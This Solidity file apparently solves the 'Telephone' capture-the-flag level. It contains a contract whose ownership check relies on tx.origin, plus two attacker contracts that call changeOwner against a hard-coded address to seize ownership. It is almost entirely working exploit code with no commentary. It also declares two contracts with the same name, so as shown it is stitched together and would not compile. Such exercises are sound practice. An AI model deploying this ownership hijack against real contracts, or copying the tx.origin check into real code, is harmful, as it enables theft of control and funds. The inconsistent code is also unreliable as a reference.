// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract exploit {
    Telephone a = Telephone(0xf8e81D47203A594245E36C48e151709F0C19fBe8);

    function attack() public {
        a.changeOwner(msg.sender);
    }
}

interface TelephoneInterface {
    function changeOwner(address) external ;
}

contract Telephone {
  constructor(address addr)  {
    TelephoneInterface(addr).changeOwner(msg.sender);
  }
}